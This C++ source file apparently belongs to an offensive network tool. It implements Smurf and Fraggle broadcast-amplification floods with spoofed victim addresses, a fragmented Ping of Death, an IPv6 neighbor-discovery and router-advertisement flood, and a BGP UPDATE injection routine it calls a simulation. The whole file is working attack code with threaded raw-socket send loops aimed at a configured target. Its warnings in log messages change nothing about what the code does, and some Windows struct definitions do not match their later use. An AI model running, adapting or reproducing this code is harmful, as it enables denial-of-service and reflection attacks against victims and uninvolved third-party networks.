#include "l3_attacks.h"
#include <random>
#include <chrono>
#include <cstring>
#include <sstream>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <iphlpapi.h>
    #define close closesocket

    // Windows doesn't have these structures, define them
    struct ip {
        uint8_t ip_hl:4;
        uint8_t ip_v:4;
        uint8_t ip_tos;
        uint16_t ip_len;
        uint16_t ip_id;
        uint16_t ip_off;
        uint8_t ip_ttl;
        uint8_t ip_p;
        uint16_t ip_sum;
        uint32_t ip_src;
        uint32_t ip_dst;
    };

    struct icmp {
        uint8_t icmp_type;
        uint8_t icmp_code;
        uint16_t icmp_cksum;
        uint16_t icmp_id;
        uint16_t icmp_seq;
    };

    struct udphdr {
        uint16_t uh_sport;
        uint16_t uh_dport;
        uint16_t uh_ulen;
        uint16_t uh_sum;
    };

    struct ip6_hdr {
        uint32_t ip6_flow;
        uint16_t ip6_plen;
        uint8_t ip6_nxt;
        uint8_t ip6_hlim;
        uint8_t ip6_src[16];
        uint8_t ip6_dst[16];
    };

    struct icmp6_hdr {
        uint8_t icmp6_type;
        uint8_t icmp6_code;
        uint16_t icmp6_cksum;
        uint32_t icmp6_data32[1];
    };

    #define IPPROTO_ICMP 1
    #define IPPROTO_UDP 17
    #define IPPROTO_ICMPV6 58
    #define ICMP_ECHO 8
    #define ND_NEIGHBOR_SOLICIT 135
    #define ND_ROUTER_ADVERT 134
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netinet/ip.h>
    #include <netinet/ip_icmp.h>
    #include <netinet/udp.h>
    #include <netinet/ip6.h>
    #include <netinet/icmp6.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

namespace laitoxx {

// Utility: Calculate IP checksum
static uint16_t calculate_checksum(uint16_t* buf, int len) {
    uint32_t sum = 0;

    for (int i = 0; i < len / 2; ++i) {
        sum += buf[i];
    }

    if (len % 2) {
        sum += ((uint8_t*)buf)[len - 1];
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return ~sum;
}

// Utility: Random IP address
static std::string random_ip() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(1, 254);

    std::stringstream ss;
    ss << dis(gen) << "." << dis(gen) << "." << dis(gen) << "." << dis(gen);
    return ss.str();
}

// ============================================================================
// Smurf Attack - ICMP broadcast amplification
// ============================================================================

void SmurfAttack::start() {
    log("Starting Smurf attack (ICMP broadcast amplification)");
    log("WARNING: This is a reflection attack that can harm third parties!");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&SmurfAttack::attack_worker, this);
    }
}

std::vector<char> SmurfAttack::build_icmp_broadcast_packet(const std::string& broadcast_addr) {
    std::vector<char> packet(sizeof(struct ip) + sizeof(struct icmp) + 56);

#ifndef _WIN32
    struct ip* ip_hdr = (struct ip*)packet.data();
    struct icmp* icmp_hdr = (struct icmp*)(packet.data() + sizeof(struct ip));

    // IP header
    ip_hdr->ip_hl = 5;
    ip_hdr->ip_v = 4;
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(packet.size());
    ip_hdr->ip_id = htons(rand());
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 255;
    ip_hdr->ip_p = IPPROTO_ICMP;
    ip_hdr->ip_sum = 0;

    // Spoofed source (victim's IP)
    inet_pton(AF_INET, config_.target_ip.c_str(), &ip_hdr->ip_src);

    // Destination is broadcast address
    inet_pton(AF_INET, broadcast_addr.c_str(), &ip_hdr->ip_dst);

    ip_hdr->ip_sum = calculate_checksum((uint16_t*)ip_hdr, sizeof(struct ip));

    // ICMP Echo Request
    icmp_hdr->icmp_type = ICMP_ECHO;
    icmp_hdr->icmp_code = 0;
    icmp_hdr->icmp_id = htons(rand());
    icmp_hdr->icmp_seq = htons(1);
    icmp_hdr->icmp_cksum = 0;

    // Fill data
    for (size_t i = sizeof(struct ip) + sizeof(struct icmp); i < packet.size(); ++i) {
        packet[i] = 'A' + (i % 26);
    }

    icmp_hdr->icmp_cksum = calculate_checksum((uint16_t*)icmp_hdr,
                                              packet.size() - sizeof(struct ip));
#endif

    return packet;
}

void SmurfAttack::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    // Common broadcast addresses to amplify through
    std::vector<std::string> broadcast_addrs = {
        "192.168.1.255",
        "192.168.0.255",
        "10.0.0.255",
        "172.16.0.255"
    };

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

#ifndef _WIN32
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            log("Error: Raw socket creation failed. Need root/admin privileges.");
            break;
        }

        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

        for (const auto& bcast : broadcast_addrs) {
            if (stop_flag_) break;

            auto packet = build_icmp_broadcast_packet(bcast);

            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            inet_pton(AF_INET, bcast.c_str(), &addr.sin_addr);

            sendto(sock, packet.data(), packet.size(), 0,
                   (struct sockaddr*)&addr, sizeof(addr));
            packets_sent_++;
        }

        close(sock);
#else
        log("Smurf attack requires raw sockets (Linux/Unix only)");
        break;
#endif

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

// ============================================================================
// Fraggle Attack - UDP broadcast amplification
// ============================================================================

void FraggleAttack::start() {
    log("Starting Fraggle attack (UDP broadcast amplification)");
    log("WARNING: This is a reflection attack that can harm third parties!");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&FraggleAttack::attack_worker, this);
    }
}

std::vector<char> FraggleAttack::build_udp_broadcast_packet(const std::string& broadcast_addr) {
    std::vector<char> packet(sizeof(struct ip) + sizeof(struct udphdr) + 512);

#ifndef _WIN32
    struct ip* ip_hdr = (struct ip*)packet.data();
    struct udphdr* udp_hdr = (struct udphdr*)(packet.data() + sizeof(struct ip));

    // IP header
    ip_hdr->ip_hl = 5;
    ip_hdr->ip_v = 4;
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(packet.size());
    ip_hdr->ip_id = htons(rand());
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 255;
    ip_hdr->ip_p = IPPROTO_UDP;
    ip_hdr->ip_sum = 0;

    // Spoofed source (victim)
    inet_pton(AF_INET, config_.target_ip.c_str(), &ip_hdr->ip_src);
    inet_pton(AF_INET, broadcast_addr.c_str(), &ip_hdr->ip_dst);

    ip_hdr->ip_sum = calculate_checksum((uint16_t*)ip_hdr, sizeof(struct ip));

    // UDP header (chargen port 19 or echo port 7)
    udp_hdr->uh_sport = htons(rand() % 65535);
    udp_hdr->uh_dport = htons(7); // Echo service
    udp_hdr->uh_ulen = htons(packet.size() - sizeof(struct ip));
    udp_hdr->uh_sum = 0;

    // Fill payload
    char* payload = packet.data() + sizeof(struct ip) + sizeof(struct udphdr);
    memset(payload, 'X', 512);
#endif

    return packet;
}

void FraggleAttack::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    std::vector<std::string> broadcast_addrs = {
        "192.168.1.255",
        "192.168.0.255",
        "10.0.0.255"
    };

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

#ifndef _WIN32
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            log("Error: Raw socket creation failed. Need root privileges.");
            break;
        }

        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

        for (const auto& bcast : broadcast_addrs) {
            if (stop_flag_) break;

            auto packet = build_udp_broadcast_packet(bcast);

            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            inet_pton(AF_INET, bcast.c_str(), &addr.sin_addr);

            sendto(sock, packet.data(), packet.size(), 0,
                   (struct sockaddr*)&addr, sizeof(addr));
            packets_sent_++;
        }

        close(sock);
#else
        log("Fraggle attack requires raw sockets (Linux/Unix only)");
        break;
#endif

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

// ============================================================================
// Ping of Death - Oversized/fragmented ICMP
// ============================================================================

void PingOfDeath::start() {
    log("Starting Ping of Death attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&PingOfDeath::attack_worker, this);
    }
}

std::vector<std::vector<char>> PingOfDeath::build_fragmented_ping(size_t total_size) {
    std::vector<std::vector<char>> fragments;

#ifndef _WIN32
    const size_t mtu = 1500;
    const size_t ip_hdr_size = sizeof(struct ip);
    const size_t icmp_hdr_size = sizeof(struct icmp);
    const size_t max_payload = mtu - ip_hdr_size;

    size_t offset = 0;
    size_t remaining = total_size;
    uint16_t frag_id = rand();

    while (remaining > 0) {
        size_t payload_size = std::min(remaining, max_payload - icmp_hdr_size);
        std::vector<char> fragment(ip_hdr_size + (offset == 0 ? icmp_hdr_size : 0) + payload_size);

        struct ip* ip_hdr = (struct ip*)fragment.data();

        // IP header
        ip_hdr->ip_hl = 5;
        ip_hdr->ip_v = 4;
        ip_hdr->ip_tos = 0;
        ip_hdr->ip_len = htons(fragment.size());
        ip_hdr->ip_id = htons(frag_id);
        ip_hdr->ip_off = htons(offset / 8);
        if (remaining > payload_size) {
            ip_hdr->ip_off |= htons(IP_MF); // More fragments
        }
        ip_hdr->ip_ttl = 64;
        ip_hdr->ip_p = IPPROTO_ICMP;
        ip_hdr->ip_sum = 0;

        inet_pton(AF_INET, random_ip().c_str(), &ip_hdr->ip_src);
        inet_pton(AF_INET, config_.target_ip.c_str(), &ip_hdr->ip_dst);

        ip_hdr->ip_sum = calculate_checksum((uint16_t*)ip_hdr, ip_hdr_size);

        // ICMP header (only in first fragment)
        if (offset == 0) {
            struct icmp* icmp_hdr = (struct icmp*)(fragment.data() + ip_hdr_size);
            icmp_hdr->icmp_type = ICMP_ECHO;
            icmp_hdr->icmp_code = 0;
            icmp_hdr->icmp_id = htons(rand());
            icmp_hdr->icmp_seq = htons(1);
            icmp_hdr->icmp_cksum = 0;
        }

        // Fill payload with garbage
        char* payload = fragment.data() + ip_hdr_size + (offset == 0 ? icmp_hdr_size : 0);
        memset(payload, 'P', payload_size);

        fragments.push_back(fragment);

        offset += payload_size;
        remaining -= payload_size;
    }
#endif

    return fragments;
}

void PingOfDeath::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

#ifndef _WIN32
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            log("Error: Raw socket creation failed. Need root privileges.");
            break;
        }

        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

        // Create oversized ping (65535 bytes total)
        auto fragments = build_fragmented_ping(65535);

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        for (const auto& fragment : fragments) {
            if (stop_flag_) break;

            sendto(sock, fragment.data(), fragment.size(), 0,
                   (struct sockaddr*)&addr, sizeof(addr));
        }

        packets_sent_++;
        close(sock);
#else
        log("Ping of Death requires raw sockets (Linux/Unix only)");
        break;
#endif

        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

// ============================================================================
// IPv6 NDP Flood
// ============================================================================

void IPv6NDPFlood::start() {
    log("Starting IPv6 NDP flood attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&IPv6NDPFlood::attack_worker, this);
    }
}

std::vector<char> IPv6NDPFlood::build_ndp_neighbor_solicitation() {
    std::vector<char> packet(sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + 24);

#ifndef _WIN32
    struct ip6_hdr* ip6_hdr = (struct ip6_hdr*)packet.data();
    struct icmp6_hdr* icmp6_hdr = (struct icmp6_hdr*)(packet.data() + sizeof(struct ip6_hdr));

    // IPv6 header
    ip6_hdr->ip6_vfc = 0x60; // Version 6
    ip6_hdr->ip6_plen = htons(sizeof(struct icmp6_hdr) + 24);
    ip6_hdr->ip6_nxt = IPPROTO_ICMPV6;
    ip6_hdr->ip6_hlim = 255;

    // Source: random link-local
    memset(&ip6_hdr->ip6_src, 0, sizeof(struct in6_addr));
    ip6_hdr->ip6_src.s6_addr[0] = 0xfe;
    ip6_hdr->ip6_src.s6_addr[1] = 0x80;
    for (int i = 8; i < 16; ++i) {
        ip6_hdr->ip6_src.s6_addr[i] = rand() & 0xFF;
    }

    // Destination: solicited-node multicast
    memset(&ip6_hdr->ip6_dst, 0, sizeof(struct in6_addr));
    ip6_hdr->ip6_dst.s6_addr[0] = 0xff;
    ip6_hdr->ip6_dst.s6_addr[1] = 0x02;
    ip6_hdr->ip6_dst.s6_addr[11] = 0x01;
    ip6_hdr->ip6_dst.s6_addr[12] = 0xff;
    ip6_hdr->ip6_dst.s6_addr[13] = rand() & 0xFF;
    ip6_hdr->ip6_dst.s6_addr[14] = rand() & 0xFF;
    ip6_hdr->ip6_dst.s6_addr[15] = rand() & 0xFF;

    // ICMPv6 Neighbor Solicitation
    icmp6_hdr->icmp6_type = ND_NEIGHBOR_SOLICIT;
    icmp6_hdr->icmp6_code = 0;
    icmp6_hdr->icmp6_cksum = 0;

    // Target address
    char* target = packet.data() + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr);
    memcpy(target, &ip6_hdr->ip6_dst, sizeof(struct in6_addr));
#endif

    return packet;
}

std::vector<char> IPv6NDPFlood::build_ndp_router_advertisement() {
    std::vector<char> packet(sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + 16);

#ifndef _WIN32
    struct ip6_hdr* ip6_hdr = (struct ip6_hdr*)packet.data();
    struct icmp6_hdr* icmp6_hdr = (struct icmp6_hdr*)(packet.data() + sizeof(struct ip6_hdr));

    // IPv6 header
    ip6_hdr->ip6_vfc = 0x60;
    ip6_hdr->ip6_plen = htons(sizeof(struct icmp6_hdr) + 16);
    ip6_hdr->ip6_nxt = IPPROTO_ICMPV6;
    ip6_hdr->ip6_hlim = 255;

    // Source: link-local router address
    memset(&ip6_hdr->ip6_src, 0, sizeof(struct in6_addr));
    ip6_hdr->ip6_src.s6_addr[0] = 0xfe;
    ip6_hdr->ip6_src.s6_addr[1] = 0x80;

    // Destination: all-nodes multicast (ff02::1)
    memset(&ip6_hdr->ip6_dst, 0, sizeof(struct in6_addr));
    ip6_hdr->ip6_dst.s6_addr[0] = 0xff;
    ip6_hdr->ip6_dst.s6_addr[1] = 0x02;
    ip6_hdr->ip6_dst.s6_addr[15] = 0x01;

    // ICMPv6 Router Advertisement
    icmp6_hdr->icmp6_type = ND_ROUTER_ADVERT;
    icmp6_hdr->icmp6_code = 0;
    icmp6_hdr->icmp6_cksum = 0;
#endif

    return packet;
}

void IPv6NDPFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

#ifndef _WIN32
        int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
        if (sock < 0) {
            log("Error: ICMPv6 socket creation failed. Need root privileges.");
            break;
        }

        // Send Neighbor Solicitations
        for (int i = 0; i < 100 && !stop_flag_; ++i) {
            auto packet = build_ndp_neighbor_solicitation();

            struct sockaddr_in6 addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin6_family = AF_INET6;

            sendto(sock, packet.data() + sizeof(struct ip6_hdr),
                   packet.size() - sizeof(struct ip6_hdr), 0,
                   (struct sockaddr*)&addr, sizeof(addr));
            packets_sent_++;
        }

        // Send Router Advertisements
        for (int i = 0; i < 10 && !stop_flag_; ++i) {
            auto packet = build_ndp_router_advertisement();

            struct sockaddr_in6 addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin6_family = AF_INET6;

            sendto(sock, packet.data() + sizeof(struct ip6_hdr),
                   packet.size() - sizeof(struct ip6_hdr), 0,
                   (struct sockaddr*)&addr, sizeof(addr));
            packets_sent_++;
        }

        close(sock);
#else
        log("IPv6 NDP flood requires raw sockets (Linux/Unix only)");
        break;
#endif

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

// ============================================================================
// BGP Hijacking Simulation (Educational/Theoretical)
// ============================================================================

void BGPHijacking::start() {
    log("Starting BGP hijacking simulation (EDUCATIONAL ONLY)");
    log("NOTE: Real BGP hijacking requires router access and is HIGHLY ILLEGAL");
    log("This is a theoretical demonstration only!");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&BGPHijacking::attack_worker, this);
    }
}

std::vector<char> BGPHijacking::build_bgp_update_message(const std::string& prefix) {
    std::vector<char> packet;

    // BGP header (19 bytes)
    for (int i = 0; i < 16; ++i) {
        packet.push_back(0xFF); // Marker
    }
    packet.push_back(0x00); // Length (placeholder)
    packet.push_back(0x00);
    packet.push_back(0x02); // Type: UPDATE

    // Withdrawn Routes Length
    packet.push_back(0x00);
    packet.push_back(0x00);

    // Total Path Attribute Length
    packet.push_back(0x00);
    packet.push_back(0x1E); // 30 bytes

    // ORIGIN attribute
    packet.push_back(0x40); // Flags
    packet.push_back(0x01); // Type: ORIGIN
    packet.push_back(0x01); // Length
    packet.push_back(0x00); // IGP

    // AS_PATH attribute
    packet.push_back(0x40);
    packet.push_back(0x02); // Type: AS_PATH
    packet.push_back(0x06); // Length
    packet.push_back(0x02); // AS_SEQUENCE
    packet.push_back(0x01); // Number of ASes
    packet.push_back(0x00); // AS number (fake)
    packet.push_back(0x00);
    packet.push_back(0xFA);
    packet.push_back(0xCE);

    // NEXT_HOP attribute
    packet.push_back(0x40);
    packet.push_back(0x03); // Type: NEXT_HOP
    packet.push_back(0x04); // Length
    // Next hop IP (fake)
    packet.push_back(192);
    packet.push_back(0);
    packet.push_back(2);
    packet.push_back(1);

    // NLRI (Network Layer Reachability Information)
    packet.push_back(0x18); // Prefix length: /24
    packet.push_back(192);  // Prefix
    packet.push_back(168);
    packet.push_back(1);

    // Update length
    uint16_t len = packet.size();
    packet[16] = (len >> 8) & 0xFF;
    packet[17] = len & 0xFF;

    return packet;
}

void BGPHijacking::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    log("BGP Hijacking: This is a THEORETICAL demonstration");
    log("Real BGP attacks require authenticated BGP session with router");
    log("Sending fake BGP UPDATE messages (will be ignored without session)");

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(179); // BGP port
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        // This will fail without proper BGP session
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            auto update = build_bgp_update_message("192.168.1.0/24");
            send(sock, update.data(), update.size(), 0);
            packets_sent_++;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

} // namespace laitoxx
